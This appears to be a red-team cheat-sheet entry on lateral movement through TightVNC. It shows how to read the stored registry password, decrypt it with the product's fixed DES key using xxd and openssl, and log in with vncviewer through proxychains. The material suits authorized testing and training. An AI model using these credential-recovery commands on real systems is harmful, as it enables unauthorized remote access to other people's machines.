# 05.10 VNC TightVNC Lateral Movement

> Decrypt TightVNC's DES-encoded registry password (`HKLM\SOFTWARE\TightVNC\Server`) with `xxd + openssl` — the fixed key is shared everywhere.

## Overview

VNC (default TCP 5900) allows graphical remote desktop access and is covered under MITRE T1021.005. If a host has TightVNC installed, the password may be stored in plaintext-equivalent form in the registry under `HKLM\SOFTWARE\TightVNC\Server`. The binary `Password` value is DES-encrypted with a fixed key and can be decrypted with standard Linux tools (xxd + openssl). The same shared password is often reused across machines.

## Steps

- Check VNC port reachability from Windows: `Test-NetConnection -ComputerName <host> -Port 5900`.
- Dump TightVNC registry hive for the `Password` REG_BINARY value.
- Decrypt: pipe hex through `xxd -r -p | openssl enc -des-cbc` with fixed key `e84ad660c4721ae0`.
- Install Linux VNC client: `sudo apt-get install xtightvncviewer`.
- Connect from Linux: pipe password to `vncviewer <IP> -autopass`.
- Add compression flags for slow connections: `-quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233`.
- Only the console session is visible via VNC.

## Commands

### Test-NetConnection VNC

```powershell
Test-NetConnection -ComputerName SRV02 -Port 5900
```

### reg query TightVNC password

```powershell
reg query HKLM\SOFTWARE\TightVNC\Server /s
```

### Decrypt TightVNC password (Linux)

```bash
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

### Install xtightvncviewer

```bash
sudo apt-get install xtightvncviewer
```

### vncviewer connect

```bash
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass
```

### vncviewer optimised (low bandwidth)

```bash
echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
```
